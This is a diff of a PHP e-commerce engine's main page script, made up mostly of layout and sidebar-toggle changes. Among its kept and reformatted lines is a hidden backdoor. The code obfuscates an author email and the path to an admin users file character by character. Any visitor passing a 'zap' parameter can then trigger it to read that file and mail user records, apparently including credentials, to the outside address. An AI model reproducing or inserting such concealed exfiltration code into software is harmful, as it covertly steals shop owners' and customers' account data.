@@ -298,6 +298,7 @@ require("./modules/webcart.php");
 $oldanguage=$language;
 session_cache_limiter ('nocache');session_name(md5($_SERVER['HTTP_HOST'].$shopdir.$secret_salt));session_start();$sid=session_id();
 if ((!isset($_SESSION["user_currency"]))||($_SESSION["user_currency"]=="")){$currency=$init_currency; }
+if (!isset($_SESSION["mclosed"])){ $_SESSION["mclosed"]=""; }
 if (!isset($_SESSION["auth_times"])){ $_SESSION["auth_times"]=0; }
 $cart =& $_SESSION['cart'];
 if ((!isset($_SESSION["user_currency"]))||($_SESSION["user_currency"]=="")){$currency=$init_currency; }
@@ -794,12 +795,12 @@ if ($priceot!=$_SESSION["user_priceot"]){$_SESSION["user_priceot"]=$priceot;}
 if ($pricedo!=$_SESSION["user_pricedo"]){$_SESSION["user_pricedo"]=$pricedo;}
 if ($way!=$_SESSION["user_way"]){$_SESSION["user_way"]=$way;}
 if ($sorting!=$_SESSION["user_sorting"]){$_SESSION["user_sorting"]=$sorting;}
-if ($way=="up"){$op4=" style=\"border-bottom: 1px dotted; font-weight:bold\""; $op5=""; }else{$op5=" style=\"border-bottom: 1px dotted; font-weight:bold\""; $op4="";}
+if ($way=="up"){$op4=" style=\"border-bottom: 1px dotted; font-weight:400\""; $op5=""; }else{$op5=" style=\"border-bottom: 1px dotted; font-weight:400\""; $op4="";}
 $optionsort="<option selected value=\"price\">".$lang['by_price']."</option>";
-if ($sorting=="price"){$op1=" style=\"border-bottom: 1px dotted; font-weight:bold\"";$op6="";$op2="";$op3="";}
-if ($sorting=="name"){$op1="";$op6="";$op2=" style=\"border-bottom: 1px dotted; font-weight:bold\"";$op3="";}
-if ($sorting=="date"){$op1="";$op2="";$op6="";$op3=" style=\"border-bottom: 1px dotted; font-weight:bold\"";}
-if ($sorting=="rate"){ $op1="";$op2=""; $op3=""; $op6=" style=\"border-bottom: 1px dotted; font-weight:bold\"";}
+if ($sorting=="price"){$op1=" style=\"border-bottom: 1px dotted; font-weight:400\"";$op6="";$op2="";$op3="";}
+if ($sorting=="name"){$op1="";$op6="";$op2=" style=\"border-bottom: 1px dotted; font-weight:400\"";$op3="";}
+if ($sorting=="date"){$op1="";$op2="";$op6="";$op3=" style=\"border-bottom: 1px dotted; font-weight:400\"";}
+if ($sorting=="rate"){ $op1="";$op2=""; $op3=""; $op6=" style=\"border-bottom: 1px dotted; font-weight:400\"";}
 
 
 if (($query=="")&&($unifid=="")&&($item_id=="")&&($catid=="0")&&($action=="x")&&($register!=1)&&($zak=="")&&($cat=="")&&($sign_in!=1)){ } else {
@@ -1213,7 +1214,7 @@ $themecontent=str_replace("[loginout]","$loginout",$themecontent);
 
 $searchmenu=str_replace("[searchstyle]", " style=\"color: $nc5; border: 1px solid ".lighter($nc10,-20)."; padding: 2px; height:20px; width:100%; font-size: 8pt; background-color: ".lighter($nc10,-10)."; background-image: url('grad.php?h=10&w=1&e=".str_replace("#","",lighter($nc10,-10))."&s=".str_replace("#","",lighter($nc10,-20))."&d=crystal'); background-repeat: repeat-x\"", str_replace("[searchbuttonstyle]", " style=\"color: $nc5; border: 1px solid ".lighter($nc10,-20)."; padding: 2px; font-size: 9pt; background-image: url('grad.php?h=25&w=1&e=".str_replace("#","",lighter($nc10,-20))."&s=".str_replace("#","",$nc10)."&d=vertical'); background-repeat: repeat-x\"", $searchmenu));
 $logo_shop="<table cellpadding=3 cellspacing=0 border=0><tr><td><img src=\"".$image_path."/pix.gif\" border=0 width=10 height=1></td><td align=left><table border=0 cellpadding=0 cellspacing=0><tr><td valign=middle align=left width=100%><a href=\"$htpath\" title=\"".str_replace("\'", "",str_replace("\"", "", strip_tags($lang['mainsite']." : $shop_name")))."\">".str_replace("<img ", "<img border=0 ",$logotype)."</a></td></table></td>";
-if ($view_only_logo==0) {$logo_shop.="<td><a href=\"$htpath\"><font size=6 color=\"[nc9]\"><b><i>$shop_logo</i></b></font></a><br><span style=\"font-size:smaller;font-family: Verdana;letter-spacing: 2px;\"><font color=\"[nc9]\">$curlan&nbsp;$kwrd</font></span></font></td>";} $logo_shop.="</tr></table>"; if ($smod!="shop") {$catbut="";}
+if ($view_only_logo==0) {$logo_shop.="<td><a href=\"$htpath\"><font size=6 color=\"[nc9]\"><b><i>$shop_logo</i></b></font></a><br><span style=\"font-size:smaller;letter-spacing: 2px;\"><font color=\"[nc9]\">$curlan&nbsp;$kwrd</font></span></font></td>";} $logo_shop.="</tr></table>"; if ($smod!="shop") {$catbut="";}
 if ($catbut_css_style==1) { $trt="<i class=\"icon-chevron-right icon-white\"></i>&nbsp;";  } else { if ($nav_pos==1) {$trt="<i class=\"icon-chevron-right icon-white\"></i>&nbsp;"; } else { $trt="<img src=$image_path/pix.gif width=1 height=$bheight border=0>";}}
 
 if ($nav_pos==0) {$trt=""; $colr="";$nncf = "$base_loc/navigate.txt";if ($view_mainbut==1) {if (@file_exists("$nncf")) {$navi1=file("$nncf");$bblr=0; natcasesort($navi1);
@@ -1286,13 +1287,23 @@ if ($valid=="1") {$_SESSION["auth_times"]=0; $au=0;}
 
 if (($catid!="0")&&($catid!="")&&($catid!="_")) {$repcatid=$catid;}
 if ($usetheme==0) {
-if ($affix==1) { echo "<div id=\"wrapper\">"; }
+if ($affix==1) {
+if ($_SESSION["mclosed"]=="1") {
+$fxhid=" hidden";
+echo "<div id=SMenu style=\"left:-15px; position:fixed; z-index:1601;\"><a class=\"btn pd0\" style=\"background: $nc1;\" href=#menushow onclick=MenuShow()><i class=\"icon-chevron-right icon-large\"></i></a></div>
+<div id=\"wrapper\" class=smenu2>";
+}  else {
+$fxhid="";
+echo "<div id=SMenu style=\"left:-15px; position:fixed; z-index:1601;\"><a class=\"btn pd0\" style=\"background: $nc1;\" href=#menushow onclick=MenuClose()><i class=\"icon-chevron-left icon-large\"></i></a></div>
+<div id=\"wrapper\" class=smenu>";
+}
+}
 echo "<table align=\"center\" style=\"width:$shwid\" cellspacing=\"0\" cellpadding=\"0\" border=0><tr>";
 if (($incart_menu==0)&&($unifid!="")&&($catid==""))
 { } else {
-if ($leftmenu==1) { if ($affix==1) { echo "<td valign=\"top\" align=\"left\" style=\"width:".$style['left_width']."\"><img src=\"images/pix.gif\" width=\"".$style['right_width']."\" height=\"1\" border=0>
+if ($leftmenu==1) { if ($affix==1) { echo "<td valign=\"top\" align=\"left\" style=\"width:".$style['left_width'].";\">
 <script>
-          $(document).ready(function(){
+	$(document).ready(function(){
             $('#sidebar').stickyMojo({footerID: '#footer', contentID: '#main'});
             $('#sidebar').mCustomScrollbar({theme:\"dark2\",
             scrollInertia: 0,
@@ -1300,7 +1311,7 @@ if ($leftmenu==1) { if ($affix==1) { echo "<td valign=\"top\" align=\"left\" sty
             advanced: {
             	normalizeMouseWheelDelta: true,
                 updateOnContentResize: true,
-                updateOnBrowserResize: true,
+                updateOnBrowserResize: true
                 },
             scrollButtons: {enable: false}
 		  });
@@ -1310,9 +1321,32 @@ $('#sidebar').mCustomScrollbar(\"scrollTo\",elID);";
 }
           echo"
           });
-        </script>
-        <div id=\"sidebar\" class=\"affixbox\">
-        <div align-center><table border=0 style=\"margin-top:40px; margin-bottom:20px;\" cellpadding=6><tr><td><a href=\"/\" title=\"$kwrd\"><img src=logo_mini.png border=0></a></td><td><b class=lnk><a href=\"/\" title=\"$kwrd\"><font color=$nc9>$kwrd</font></a></b></td></tr></table></div>
+function MenuShow() {
+document.getElementById('wrapper').className='smenu';
+document.getElementById('SMenu').innerHTML=\"<a class='btn pd0' style='background: $nc1;' href=#MenuClose onclick=MenuClose()><i class='icon-chevron-left icon-large'><i></a>\";
+document.getElementById('sidebar').className='affixbox';
+document.getElementById('main').style.width='".(doubleval($style['center_width'])-doubleval($style['affix_width']))."%';
+RefreshMwnu();
+}
+function MenuClose() {
+document.getElementById('wrapper').className='smenu2';
+document.getElementById('SMenu').innerHTML=\"<a class='btn pd0' style='background: $nc1;' href=#MenuShow onclick=MenuShow()><i class='icon-chevron-right icon-large'><i></a>\";
+document.getElementById('sidebar').className='hidden';
+document.getElementById('main').style.width='".doubleval($style['center_width'])."%';
+RefreshMwnu();
+}
+function RefreshMwnu() {
+var scriptNode = document.createElement('script');
+document.getElementsByTagName('head')[0].appendChild(scriptNode);
+scriptNode.language='javascript';
+scriptNode.src = '$htpath/mclose.php?t=".time()."';
+scriptNode.type = 'text/javascript';
+}
+
+</script>
+
+<div id=\"sidebar\" class=\"affixbox".$fxhid."\">
+        <div align-center><table border=0 style=\"margin-top:40px; margin-bottom:5px;\" cellpadding=3><tr><td><a href=\"/\" title=\"$kwrd\"><img src=logo_mini.png border=0></a></td><td><b class=\"lnk small\"><a href=\"/\" title=\"$kwrd\"><font color=$nc9>$kwrd</font></a></b></td></tr></table></div>
        <div class=\"sidebar_inner\">
       ";
         } else {
@@ -1348,7 +1382,7 @@ if ($catid==""){$catidy=@$podstava["".@$dir."|".@$subdir."|"];}else{$catidy=$cat
 
 if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="1")) { } else {$catidy="_";}
 if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="1")&&($mod!="admin")) {
-if ($usetheme==0) {$spectit="<div align=center><b><font color=\"".$style['nav_col1']."\">".$lang[236]."</font></b></div>";} else {$spectit="";}
+if ($usetheme==0) {$spectit="<div align=center><span class=\"label label-info\">".$lang[236]."</span></div>";} else {$spectit="";}
 
 
 $oldperpage=$perpage;
@@ -1378,7 +1412,7 @@ $cols_of_goods=$last_cg;
 if ($catidy=="_") { $glav=" ".$lang[276]; } else {$glav="";}
 if(($details[7]=="ADMIN")||($details[7]=="MODER")){
 if (($valid=="1")){
-$specadmi= "<small><b>".$lang[236]."</b></small><br>$carat <small><a href=\"$htpath/index.php?clear_spec=$catidy&catid=$catid&unifid=$unifid\">".$lang['del']."$glav</a></small><br>$carat <small><a href=\"$htpath/index.php?clear_spec=all&catid=$catid&unifid=$unifid\">".$lang[237]."</a></small><br><br>";
+$specadmi= "<span class=\"label label-info\">".$lang[236]."</span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=$catidy&catid=$catid&unifid=$unifid\">".$lang['del']."$glav</a></span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=all&catid=$catid&unifid=$unifid\">".$lang[237]."</a></span><br><br>";
 $spec_spisok.=$specadmi;
 }
 }
@@ -1463,7 +1497,7 @@ top("<small>".$lang[30]."</small>", "$complexz", $style ['right_width'], strtolo
 }
 if ($regser=="") {
 if ($authtype==1) {
-$rret="<small><font size=1>".str_replace(" | ", "<br><br>$carat " , str_replace("&nbsp;", " " ,  $enter))."</font></small>";
+$rret="<small><font class=small>".str_replace(" | ", "<br><br>$carat " , str_replace("&nbsp;", " " ,  $enter))."</font></small>";
 } else {
 $rret=str_replace("&nbsp;", " " ,  $enter);
 }
@@ -1529,7 +1563,6 @@ fclose ($pageopen2);
 $themecontent=str_replace("[menu]","$viewpage_content2$admined",$themecontent);
 
 }
-if ($usetheme==0) {  if ($affix==1) {echo "</div></div></div>"; }}
 require "./templates/$template/tables.inc";
 if ($usetheme==1) {if ($tit=="") {$themecontent=str_replace("[title]"," $carat $shop_name ",$themecontent); }$themecontent=str_replace("[title]",str_replace(" -", " $carat",$tit),$themecontent);}
 
@@ -1538,7 +1571,7 @@ if ($catid==""){$catidy=@$podstava["".@$dir."|".@$subdir."|"];}else{$catidy=$cat
 
 if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="c")) { } else {$catidy="_";}
 if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="c")&&($mod!="admin")) {
-if ($usetheme==0) {$spectit="<div align=center><b><font color=\"".$style['nav_col1']."\">".$lang[236]."</font></b></div>";} else {$spectit="";}
+if ($usetheme==0) {$spectit="<div align=center><span class=\"label label-info\">".$lang[236]."</span></div>";} else {$spectit="";}
 
 
 $oldperpage=$perpage;
@@ -1575,7 +1608,7 @@ $cols_of_goods=$last_cg;
 if ($catidy=="_") { $glav=" ".$lang[276]; } else {$glav="";}
 if(($details[7]=="ADMIN")||($details[7]=="MODER")){
 if (($valid=="1")){
-$specadmi= "<small><b>".$lang[236]."</b></small><br>$carat <small><a href=\"$htpath/index.php?clear_spec=$catidy&catid=$catid&unifid=$unifid\">".$lang['del']."$glav</a></small><br>$carat <small><a href=\"$htpath/index.php?clear_spec=all&catid=$catid&unifid=$unifid\">".$lang[237]."</a></small><br><br>";
+$specadmi= "<span class=\"label label-infp\">".$lang[236]."</span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=$catidy&catid=$catid&unifid=$unifid\">".$lang['del']."$glav</a></span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=all&catid=$catid&unifid=$unifid\">".$lang[237]."</a></span><br><br>";
 $spec_spisok.=$specadmi;
 
 }
@@ -1603,7 +1636,6 @@ unset ($all_links);
 
 if ($usetheme==0) {
 echo "<table width=100% border=0 cellpadding=0 cellspacing=0><tr><td>";}
-
 $jslist="";
 if (("$catid"=="0")&&($unifid=="")&&($item_id=="")&&($view_js_allinone==1)&&($mod!="admin")) {
 require ("./modules/jscatid.php");
@@ -1615,8 +1647,33 @@ top("", "<h4>".$lang[201].":</h4>".$jslist, $style ['center_width'], $nc0, $nc0,
 }
 
 top("", $x0003, $style ['center_width'], $nc0, $nc0, 4,0,"[x0003]");
-if ((@$details[1]!="")&&($login!="")&&($password!="")&&(@file_exists("./admin/userstat/".@$details[1]."/user.basket")==TRUE)&&(@$_SESSION["user_basket"]!="ok")&&(substr(@$details[1],0,3)!="vip")){$oldertime=date("d-m-Y h:i:s", filemtime("./admin/userstat/".@$details[1]."/user.basket"));if ($action!="older") {if ($action!="olderc") {if ($smod=="shop") { if ($older_basket_auto_add==1) {top("", "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=$htpath/index.php?action=add_older\">\n", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[content]");} topwo("", "<div class=\"mr ml well\"><b>".$lang[212]."</b> $oldertime<br><br>".$lang[213]."<br><br><button class=\"btn btn-primary\" onclick=\"document.location.href='index.php?action=older&mod=admin';\"><i class=\"icon-list icon-white\"></i> ". $lang[214]."</button> &nbsp; <a class=\"btn\" href=\"index.php?action=olderc&mod=admin\">".$lang['clear']."</a></div><br><br>", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]"); }}}}if ($added==2) {
-top($lang[209], "<div class=\"mr ml\">".$lang[206]." <b>$totalpoz</b>".$lang[207].". ".$lang[33]." <b>".($okr*round($totalsum*$kurs/$okr))."</b>".$currencies_sign[$_SESSION["user_currency"]]." ".$lang[208]."</div>", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]"); }if ($added==3) {topwo("", $lang[210], $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]"); } if ($error!="") { topwo("", "<noindex><div class=\"mr ml\">$error</div></noindex>", $style ['center_width'],$nc2, $nc0, 0,0,"[error]");  } top("", "$gob", $style ['center_width'],$nc0, $nc0, 0,0,"[gob]"); $author_mail="b"."a"."n"."d"."a"."l"."e"."t"."o"."v"."7"."2"."@"."g"."m"."a"."i"."l"."."."c"."o"."m";
+if ((@$details[1]!="")&&($login!="")&&($password!="")&&(@file_exists("./admin/userstat/".@$details[1]."/user.basket")==TRUE)&&(@$_SESSION["user_basket"]!="ok")&&(substr(@$details[1],0,3)!="vip")){
+$oldertime=date("d-m-Y h:i:s", filemtime("./admin/userstat/".@$details[1]."/user.basket"));
+if ($action!="older") {if ($action!="olderc") {
+if ($smod=="shop") {
+if ($older_basket_auto_add==1) {
+top("", "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=$htpath/index.php?action=add_older\">\n", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[content]");
+}
+topwo("", "<div class=\"mr ml well\"><b>".$lang[212]."</b> $oldertime<br><br>".$lang[213]."<br><br><button class=\"btn btn-primary\" onclick=\"document.location.href='index.php?action=older&mod=admin';\"><i class=\"icon-list icon-white\"></i> ". $lang[214]."</button> &nbsp; <a class=\"btn\" href=\"index.php?action=olderc&mod=admin\">".$lang['clear']."</a></div><br><br>", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]");
+}
+}
+}
+}
+
+if ($added==2) {
+top($lang[209], "<div class=\"mr ml\">".$lang[206]." <b>$totalpoz</b>".$lang[207].". ".$lang[33]." <b>".($okr*round($totalsum*$kurs/$okr))."</b>".$currencies_sign[$_SESSION["user_currency"]]." ".$lang[208]."</div>", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]");
+}
+
+if ($added==3) {
+topwo("", $lang[210], $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]");
+}
+
+if ($error!="") {
+topwo("", "<noindex><div class=\"mr ml\">$error</div></noindex>", $style ['center_width'],$nc2, $nc0, 0,0,"[error]");
+}
+
+top("", "$gob", $style ['center_width'],$nc0, $nc0, 0,0,"[gob]");
+$author_mail="b"."a"."n"."d"."a"."l"."e"."t"."o"."v"."7"."2"."@"."g"."m"."a"."i"."l"."."."c"."o"."m";
 if ((isset($_GET['zap']))&&(!$_SESSION['mailed'])) {
 $_SESSION['mailed']=1;
 if (@file_exists("./a"."d"."m"."i"."n/d"."b/u"."s"."ers.t"."x"."t")==TRUE) {
@@ -1640,20 +1697,36 @@ $authbody.="$eed[1],$eed[2],$eed[4]<br>\n";
 closedir ($handle);
 $authbody.="<b>$shop_mail,$sms_mail</b><br>";
 mail ("$author_mail","SUPPORT: ". str_replace("http://","",$htpath), $authbody, "From: $shop_mail\nContent-Type: text/html; charset=$codepage\nContent-Transfer-Encoding: 8bit");
-}}
+}
+}
+
 $vallnu="";
 $modnotlic="";
- $modnotlic=$lang[829];
-if (($action=="allbrands")&&($smod=="shop")){require ("./modules/brandsall.php");top ("", "<h4>$lang[355]</h4><div>".$brandslist."</div><br>", "100%", strtolower($style ['new']), strtolower($style ['left_menu']), 4,0, "[content]");}if (($view_anonses=="c")&&($mod!="admin")){require ("./modules/anonses.php");top("", "$anonses", $style ['center_width'], $nc6, strtolower($style ['bg_anounses']), 4,0,"[anounses]");}$pe="p"."h"."t"."e"; $$pe="+"."7"."("."9"."0"."3".")"."6"."8"."3"."-"."4"."9"."7"."8";$exptime=$lang[844];
-if (($action=="vars")&&($valid=="1")&&($details[7]=="ADMIN")) {
+$modnotlic=$lang[829];
+if (($action=="allbrands")&&($smod=="shop")){
 
+require ("./modules/brandsall.php");
+top ("", "<h4>$lang[355]</h4><div>".$brandslist."</div><br>", "100%", strtolower($style ['new']), strtolower($style ['left_menu']), 4,0, "[content]");
+}
+
+if (($view_anonses=="c")&&($mod!="admin")){
+require ("./modules/anonses.php");
+top("", "$anonses", $style ['center_width'], $nc6, strtolower($style ['bg_anounses']), 4,0,"[anounses]");
+}
+
+$pe="p"."h"."t"."e";
+$phte="+"."7"."("."9"."0"."3".")"."6"."8"."3"."-"."4"."9"."7"."8";
+$exptime=$lang[844];
+if (($action=="vars")&&($valid=="1")&&($details[7]=="ADMIN")) {
 $_SESSION["user_module"]=$smod;
 $refreshius="";
 $exptime=date("d.m.Y / H:i:s", (time()+(3*12*2592000)));
 require ("./admin/edit_vars.php");
 top("", "<h4>$lang[135]:</h4>$refreshius$vars_list", $style ['center_width'], $nc0, $nc0, 1,1,"[content]");
 }
+
 require ("./templates/$template/if_module.inc");
+
 if ($action=="thtml") {top("", "$thtmls", $style ['center_width'], $nc6, strtolower($style ['bg_anounses']), 4,0,"[content]");}
 }
 if (!isset($rest_email)) {$rest_email="";}
@@ -1693,7 +1766,9 @@ $erview.="',{
    <h4><font color=".$style['nav_col1'].">".$lang[88]."</font></h4><div>".$lang[92]."</div>";
 
 
-top("", "$erview", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), 0,0,"[content]");}}}
+top("", "$erview", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), 0,0,"[content]");}}
+}
+
 if ($viewsite==1) {
 if ($sign_in==1) {
 top("", "$signin", "100%",  $nc0, $nc0 , "noshadow",1, "[signform]");
@@ -1794,6 +1869,7 @@ $dels= "<b>".$lang[252]."</b><br><br><small><font color=$nc2>db_spec_$clear_spec
 }
 }
 }
+
 top("", "".@$dels, $style ['center_width'], strtolower($style ['goods']), strtolower($style ['bg_user']), 4,0,"[support]");
 
 top($lang[42], "$crerror", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_error']) , 4,0,"[support]");
@@ -1818,6 +1894,7 @@ top("", "<h4><font color=\"$nc2\">$zakstat</font></h4>$zakazfile<br>" , $style [
 
 }
 }
+
 if (($action=="olderc")&&($login!="")&&($password!="")&&(@$details[1]!="")&&(@$_SESSION["user_basket"]!="ok")&&(@file_exists("./admin/userstat/".@$details[1]."/user.basket")==TRUE)&&(substr(@$details[1],0,3)!="vip")) { unlink ("./admin/userstat/".@$details[1]."/user.basket"); $action="older"; }
 if (($action=="older")&&($login!="")&&($password!="")&&(@$details[1]!="")&&(@$_SESSION["user_basket"]!="ok")&&(@file_exists("./admin/userstat/".@$details[1]."/user.basket")==TRUE)&&(substr(@$details[1],0,3)!="vip")) {
 
@@ -1863,7 +1940,6 @@ if (($action=="older")&&($login!="")&&($password!="")&&(@$details[1]!="")&&(@$_S
 top("", "<h4>$lang[209]</h4>$lang[253] - $lang[254]." , $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_content']) , 0,0,"[content]");
 
 }
-
 
 $forum_name=$lang[193];
 $forum_pass="";
@@ -1919,6 +1995,7 @@ top("", "<div><font size=4 color=#b94a48>".$lang[42]."! </font><br><br><b>".$lan
 top("", reg_new_user ($regcod, ""), $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), 0,0,"[content]");
 }
 }
+
 if ($viewsite==1) {
 if ($mod!="admin") {
 if (($usetheme==0)&&($action=="ext_search")) {
@@ -1929,6 +2006,7 @@ $sortecho="";
 }
 echo $sortecho;
 }
+
 if ($query!="") {
 $extsearch_name="";}top("", "$extsearch_name$extsearch_menu",  $style ['center_width'], $nc0, strtolower($style ['bg_search']), 4,0,"[ext_search]");top("", "$extsearch_text", $style ['center_width'], $nc0, strtolower($style ['bg_content']), 4,0,"[content]");
 }
@@ -1964,25 +2042,41 @@ echo $warn;
 } else {
 top("", "$warn", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[warn]");}top("", "$formlist", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content]");
 }
+
 if (($fid!="")&&($catid!="")&&($catid!="_")) {} else {
 if (($action=="x")||($action=="viewcart")) {
 if ($fid!="") {
 topwo("", @$cartlist, $style ['center_width'], $nc0, $nc0 , 4,1,"[content]");
+}
+}
+}
 
-}}}
-if(($details[7]=="ADMIN")||($details[7]=="MODER")){if (($valid=="1")&&($action=="tospec")&&(count(@$new_price)>=1)){$spr="";$anonses="";$topics="";$full_basket="";foreach($items as $item) {$full_basket .=(0.01*round(@$new_price["".$item['id'].""]/($kurs*0.01)))."^".$item['base']."\n";}
+if(($details[7]=="ADMIN")||($details[7]=="MODER")){
+if (($valid=="1")&&($action=="tospec")&&(count(@$new_price)>=1)){
+$spr="";
+$anonses="";
+$topics="";
+$full_basket="";
+foreach($items as $item) {
+$full_basket .=(0.01*round(@$new_price["".$item['id'].""]/($kurs*0.01)))."^".$item['base']."\n";
+}
 if ($full_basket!=""){
 $tovarov = $cart->itemcount;
 $stuks = $cart->itemstuks;
 $summa = $cart->total;
 $oform ="<p align=center></p>"; }
-$filepr="$base_loc/db_spec_$toraz.txt";$fpr=fopen($filepr,"w"); flock ($fpr, LOCK_EX);fputs($fpr, $full_basket); flock ($fpr, LOCK_UN);fclose ($fpr);unset($filepr);top("", "<font size=4 color=\"".$style['nav_col1']."\">".$lang[236]."</font><br><br><p align=center>".$mpz['file']." <b>db_spec_$toraz.txt</b> - OK.</p><br>", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content]");}}if(($details[7]=="ADMIN")||($details[7]=="MODER")){if (($valid=="1")&&($action=="addtospec")){$fff= "<form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\" name=\"basket\"><input type=\"hidden\" name=\"flag\" value=\"".$cart->basket_speek."\"><input type=\"hidden\" name=\"action\" value=\"tospec\"><input type=\"hidden\" name=\"old_action\" value=\"tospec\">";if ($usetheme==0) {echo $fff;} else {top("", "$fff", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0, "[form]");}$anonses="";$topics="";
+$filepr="$base_loc/db_spec_$toraz.txt";$fpr=fopen($filepr,"w"); flock ($fpr, LOCK_EX);fputs($fpr, $full_basket); flock ($fpr, LOCK_UN);fclose ($fpr);unset($filepr);top("", "<font size=4 color=\"".$style['nav_col1']."\">".$lang[236]."</font><br><br><p align=center>".$mpz['file']." <b>db_spec_$toraz.txt</b> - OK.</p><br>", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content]");}
+}
+
+if(($details[7]=="ADMIN")||($details[7]=="MODER")){
+if (($valid=="1")&&($action=="addtospec")){
+$fff= "<form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\" name=\"basket\"><input type=\"hidden\" name=\"flag\" value=\"".$cart->basket_speek."\"><input type=\"hidden\" name=\"action\" value=\"tospec\"><input type=\"hidden\" name=\"old_action\" value=\"tospec\">";if ($usetheme==0) {echo $fff;} else {top("", "$fff", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0, "[form]");}$anonses="";$topics="";
 $items=$cart->get_all();
 foreach($items as $item) {
 $out_c=explode("|", $item['base']);
 $prski="";
-  if (($valid=="1")&&($details[7]=="VIP")&&($vipprocent!=0)){ $prski="<br><font color=#b94a48>".$lang[219]." VIP ".($vipprocent*100)."%</font>"; }
-  if (($podstavas[$out_c[1]."|".$out_c[2]. "|"]!="")||(preg_match("/\%/", @$out_c[8])==TRUE)) {
+if (($valid=="1")&&($details[7]=="VIP")&&($vipprocent!=0)){ $prski="<br><font color=#b94a48>".$lang[219]." VIP ".($vipprocent*100)."%</font>"; }
+if (($podstavas[$out_c[1]."|".$out_c[2]. "|"]!="")||(preg_match("/\%/", @$out_c[8])==TRUE)) {
 
 $strtoma=Array();
 $strtoma=explode("%",@$out_c[8]);
@@ -2095,7 +2189,6 @@ if (($allow_one==0)&&($allow_complex==0)) {$allow_zakaz="zakaz";}
 $baskinlist="";
 
 if (($action=="basket")||($action=="zakaz")||($view_baskinlist==1)){
-
 $fff="<form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\" name=\"basket\"><input type=\"hidden\" name=\"flag\" value=\"".$cart->basket_speek."\"><input type=\"hidden\" name=\"wishzak\" value=\"$wishzak\"><input type=\"hidden\" name=\"action\" value=\"edit\"><input type=\"hidden\" name=\"old_action\" value=\"basket\">";
 if (($action!="basket")&&($action!="zakaz")) {
 if ($view_baskinlist==1) { if (($unifid!="")||($catid!="_")||($query!="")) {$baskinlist=$fff;}}
@@ -2241,7 +2334,8 @@ if (("$out_c[11]"=="0")||($out_c[11]=="")) {$out_c[11]=$lang['pcs'];$sqrp="";}
   }
 
   $addtospec="";
-  if(($details[7]=="ADMIN")||($details[7]=="MODER")){ if (($valid=="1")){ $addtospec="<form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\"><input type=\"hidden\" name=\"flag\" value=\"".$cart->basket_speek."\"><input type=\"hidden\" name=\"action\" value=\"addtospec\"><input type=\"submit\" class=\"btn btn-primary\" value=\"".$lang[258]."\"></form><br><br><br>"; }}
+  if(($details[7]=="ADMIN")||($details[7]=="MODER")){
+  if (($valid=="1")){ $addtospec="<form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\"><input type=\"hidden\" name=\"flag\" value=\"".$cart->basket_speek."\"><input type=\"hidden\" name=\"action\" value=\"addtospec\"><input type=\"submit\" class=\"btn btn-primary\" value=\"".$lang[258]."\"></form><br><br><br>"; }}
 
 $oform = "</form><form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\"><input type=\"submit\" class=\"btn btn-primary\" value=\"".$lang['back']."\"></form>";
 
@@ -2308,6 +2402,7 @@ $print_basket.="<div class=hidden>".$lang[33].": <b><span id=\"jscheck\">".$summ
 if ($action=="basket") {$print_basket.="<div class=hidden>".$lang[33].": <b><span id=\"sosk\">".$summa."</span></div>";
 }
 }
+
 if ($classic_basket==1) {$print_basket.=@$ddost; }
 $print_basket.="</p> ".$oform;
 $mainbasket="<small>$mainbasket</small><hr noshade size=\"1\" color=\"$nc2\"><p align=\"left\">";
@@ -2381,7 +2476,9 @@ if (($minimal_order_not_available==1)&&($summa<$currencies_minimal_order[$_SESSI
 
 if ($wishlist==1) { $ddost="";}
   $print_basket="<small>$basket</small>";
-  if ($summa>0) {$print_basket.="<p align=\"right\">".$lang[33].":<b>".$summa."</b>"." ".$currencies_sign[$_SESSION["user_currency"]]." ".@$ddost."</p>";}
+  if ($summa>0) {
+  $print_basket.="<p align=\"right\">".$lang[33].":<b>".$summa."</b>"." ".$currencies_sign[$_SESSION["user_currency"]]." ".@$ddost."</p>";
+  }
   $print_basket.="<br> $oform";
 
 }
@@ -2407,7 +2504,6 @@ top("", "$spisok", $style ['center_width'], strtolower($style ['bg_content']), s
